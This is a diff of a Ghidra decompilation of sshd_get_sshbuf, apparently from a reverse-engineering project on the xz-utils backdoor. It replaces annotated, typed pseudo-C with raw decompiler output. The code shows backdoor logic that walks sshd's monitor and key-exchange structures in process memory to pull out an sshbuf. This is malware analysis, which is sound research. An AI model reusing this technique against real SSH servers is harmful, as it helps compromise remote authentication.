@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/107A20_sshd_get_sshbuf.c
 // Function: sshd_get_sshbuf @ 0x107A20
-// Calling convention: __stdcall
-// Prototype: BOOL __stdcall sshd_get_sshbuf(sshbuf * sshbuf, global_context_t * ctx)
+// Calling convention: unknown
+// Prototype: undefined sshd_get_sshbuf(void)
 
 
 /*
@@ -10,85 +10,93 @@
 #include "xzre_types.h"
 
 
-BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
+undefined1  [16] sshd_get_sshbuf(long *param_1,long param_2,ulong param_3,undefined8 param_4)
 
 {
-  kex *pkVar1;
-  char cVar2;
-  byte bVar3;
-  byte bVar4;
-  monitor *addr;
-  BOOL BVar5;
-  EncodedStringId EVar6;
-  ulong uVar7;
-  ulong uVar8;
-  kex **addr_00;
-  kex *addr_01;
-  u64 length;
+  undefined8 *puVar1;
+  undefined1 auVar2 [16];
+  int iVar3;
+  ulong uVar4;
+  ulong uVar5;
+  long *plVar6;
+  undefined8 *puVar7;
+  long lVar8;
   uint uVar9;
+  undefined1 auVar10 [16];
   
-  if (sshbuf == (sshbuf *)0x0) {
-    return FALSE;
+  if (param_1 == (long *)0x0) {
+    auVar2._8_8_ = 0;
+    auVar2._0_8_ = param_3;
+    return auVar2 << 0x40;
   }
-  if (((ctx != (global_context_t *)0x0) && (ctx->struct_monitor_ptr_address != (monitor **)0x0)) &&
-     (BVar5 = is_range_mapped((u8 *)ctx->struct_monitor_ptr_address,8,ctx), BVar5 != FALSE)) {
-    addr = *ctx->struct_monitor_ptr_address;
-    BVar5 = is_range_mapped((u8 *)addr,0x20,ctx);
-    if (BVar5 != FALSE) {
-      cVar2 = *(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 1);
-      addr_00 = addr->m_pkex;
-      if (-1 < cVar2) {
-        addr_00 = *(kex ***)((long)&addr->m_recvfd + (long)((int)cVar2 << 2));
-      }
-      bVar3 = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
-      bVar4 = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
-      length = 0x48;
-      if (-1 < (char)(bVar4 & bVar3)) {
-        uVar8 = (ulong)((int)(char)bVar3 << 3);
-        uVar7 = (ulong)((int)(char)bVar4 << 3);
-        length = uVar8 + 8;
-        if (uVar8 < uVar7) {
-          length = uVar7 + 8;
+  if ((param_2 != 0) && (*(long *)(param_2 + 0x48) != 0)) {
+    iVar3 = is_range_mapped(*(long *)(param_2 + 0x48),8,param_2);
+    if (iVar3 != 0) {
+      lVar8 = **(long **)(param_2 + 0x48);
+      iVar3 = is_range_mapped(lVar8,0x20,param_2);
+      if (iVar3 != 0) {
+        plVar6 = *(long **)(lVar8 + 0x10);
+        if (-1 < *(char *)(param_2 + 0x55)) {
+          plVar6 = *(long **)(lVar8 + ((int)*(char *)(param_2 + 0x55) << 2));
         }
-      }
-      BVar5 = is_range_mapped((u8 *)addr_00,8,ctx);
-      if ((BVar5 != FALSE) && (BVar5 = is_range_mapped((u8 *)*addr_00,0x400,ctx), BVar5 != FALSE)) {
-        cVar2 = *(char *)&(ctx->sshd_offsets).field0_0x0;
-        addr_01 = *addr_00;
-        if (cVar2 < '\0') {
-          uVar9 = 0;
-          pkVar1 = addr_01 + 0x400;
-          for (; addr_01 < pkVar1; addr_01 = addr_01 + 8) {
-            BVar5 = is_range_mapped((u8 *)addr_01,length,ctx);
-            if ((BVar5 != FALSE) &&
-               (BVar5 = sshbuf_extract(*(sshbuf **)addr_01,ctx,&sshbuf->d,&sshbuf->size),
-               BVar5 != FALSE)) {
-              if (uVar9 < 2) {
-                EVar6 = get_string_id((char *)sshbuf->d,(char *)(sshbuf->d + 7));
-                if ((EVar6 == STR_SSH_2_0) || (EVar6 == STR_ssh_2_0)) {
-                  uVar9 = uVar9 + 1;
-                }
-              }
-              else {
-                BVar5 = sshbuf_bignum_is_negative(sshbuf);
-                if (BVar5 != FALSE) {
-                  return TRUE;
+        lVar8 = 0x48;
+        if (-1 < (char)(*(byte *)(param_2 + 0x56) & *(byte *)(param_2 + 0x57))) {
+          uVar5 = (ulong)((int)(char)*(byte *)(param_2 + 0x57) << 3);
+          uVar4 = (ulong)((int)(char)*(byte *)(param_2 + 0x56) << 3);
+          lVar8 = uVar5 + 8;
+          if (uVar5 < uVar4) {
+            lVar8 = uVar4 + 8;
+          }
+        }
+        iVar3 = is_range_mapped(plVar6,8,param_2);
+        if (iVar3 != 0) {
+          iVar3 = is_range_mapped(*plVar6,0x400,param_2);
+          if (iVar3 != 0) {
+            puVar7 = (undefined8 *)*plVar6;
+            if (*(char *)(param_2 + 0x54) < '\0') {
+              uVar9 = 0;
+              puVar1 = puVar7 + 0x80;
+              for (; puVar7 < puVar1; puVar7 = puVar7 + 1) {
+                iVar3 = is_range_mapped(puVar7,lVar8,param_2);
+                if (iVar3 != 0) {
+                  iVar3 = sshbuf_extract(*puVar7,param_2,param_1,param_1 + 3);
+                  if (iVar3 != 0) {
+                    if (uVar9 < 2) {
+                      iVar3 = get_string_id(*param_1,*param_1 + 7);
+                      if ((iVar3 == 0x990) || (iVar3 == 0xd08)) {
+                        uVar9 = uVar9 + 1;
+                      }
+                    }
+                    else {
+                      iVar3 = sshbuf_bignum_is_negative(param_1);
+                      if (iVar3 != 0) {
+                        uVar4 = 1;
+                        goto LAB_00107ba8;
+                      }
+                    }
+                  }
                 }
               }
             }
-          }
-        }
-        else {
-          BVar5 = sshbuf_extract(*(sshbuf **)(addr_01 + ((int)cVar2 << 3)),ctx,&sshbuf->d,
-                                 &sshbuf->size);
-          if (BVar5 != FALSE) {
-            BVar5 = sshbuf_bignum_is_negative(sshbuf);
-            return (uint)(BVar5 != FALSE);
+            else {
+              iVar3 = sshbuf_extract(*(undefined8 *)
+                                      ((long)((int)*(char *)(param_2 + 0x54) << 3) + (long)puVar7),
+                                     param_2,param_1,param_1 + 3);
+              if (iVar3 != 0) {
+                iVar3 = sshbuf_bignum_is_negative(param_1);
+                uVar4 = (ulong)(iVar3 != 0);
+                goto LAB_00107ba8;
+              }
+            }
           }
         }
       }
     }
   }
-  return FALSE;
+  uVar4 = 0;
+LAB_00107ba8:
+  auVar10._8_8_ = param_4;
+  auVar10._0_8_ = uVar4;
+  return auVar10;
 }
 
